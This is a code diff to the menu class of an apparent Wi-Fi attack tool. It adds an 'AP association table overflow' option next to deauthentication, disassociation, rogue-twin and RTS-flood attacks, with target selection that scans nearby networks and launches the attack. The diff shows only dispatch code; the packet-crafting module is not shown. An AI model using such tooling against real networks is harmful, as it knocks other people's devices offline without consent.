@@ -20,12 +20,13 @@ class UI:
         self.attack_int = attack_int
         self.control_int = control_int
         self.attacks = [self.rts_flood, self.null_probe_response, self.rogue_twin, self.deauth, self.disassoc,
-                        self.Omerta_Attack]
+                        self.Omerta_Attack, self.AP_ass_table_overflow]  # add new attack method here
         self.attacker = Attacker.attacker(self.attack_int)
         self.sniffer = Sniffer.sniffer(self.control_int, self.attack_int)
 
     def main_window(self):
-        raws = [["0", "RTS flood",
+        # add new attack method here
+        raws =     [["0", "RTS flood",
                  "Floods RTS/CTS frames to reserve the RF medium and force other wireless devices sharing the RF medium to hold back their transmissions"]]
         raws.append(["1", "Null Probe Response", "Sending probe response containing a null SSID. Causes lock up upon receiving such a probe response"])
         raws.append(["2", "Rogue twin", "Creates fake AP with the same channel and SSID as target"])  # "✅" "❌"
@@ -33,12 +34,50 @@ class UI:
         raws.append(["4", "Disassociation attack", "Attempts to disconnect specific clients in range by sending disassociation frames"])
         raws.append(["5", "Omerta Attack",
                      "Attempts to disconnect clients by sending disassociation frames with a reason code of 0x01 (“unspecified”) to all stations in wireless net"])
-        raws.append(["6", "Coming soon", "..."])
+        raws.append(["6", "AP association table overflow", "Floods AP with association + authentication requests to overflow association table"])
+        raws.append(["7", "Coming soon", "..."])
         self.screen.draw_table(["No.", "Name", "Brief descr."], raws)
 
         attack = self.screen.get_input("Witch attack you wanna run? (type its number)", int)
         if attack in range(len(self.attacks)):
             self.attacks[attack]()
+
+    def AP_ass_table_overflow(self):
+        self.screen.clean()
+
+        Freq = self.__ask_Freq('''AP association table overflow Attack\n''')
+
+        self.nets = self.sniffer.scan_nets_(Freq)
+
+        while len(self.nets[0]) == 0:
+            self.screen.print_label()
+            self.screen.print_text(f"No nets found at freq {Freq}!")
+            if "y" in (self.screen.get_input("Rescan it? (y/n)", str)).lower():
+                self.screen.clean()
+                self.nets = self.sniffer.scan_nets_(Freq)
+            else:
+                return
+
+        self.screen.clean()
+
+        self.screen.draw_table(["No.", "SSID", "BSSID", "Freq", "Channel", "802.11 standart"], self.nets,
+                               '''AP association table overflow Attack\n'''
+                               '''Choose nets to be attacked''')
+        target_nets = self.screen.get_input("Choose nets to be attacked (print digit or combination using commas \",\"):", var_type=str)
+
+        args = []
+        target = []
+        for net in (target_nets.replace(" ", "")).split(','):
+            i = int(net)
+            args.append({
+                "SSID":    self.nets[i][1],
+                "BSSID":   self.nets[i][2],
+                "Freq":    self.nets[i][3],
+                "Channel": self.nets[i][4]
+            })
+            target.append([self.nets[i][1], self.nets[i][2]])
+
+        self.run_attack("AP_assoc_table_overflow", target, args)
 
     def Omerta_Attack(self):
         self.screen.clean()
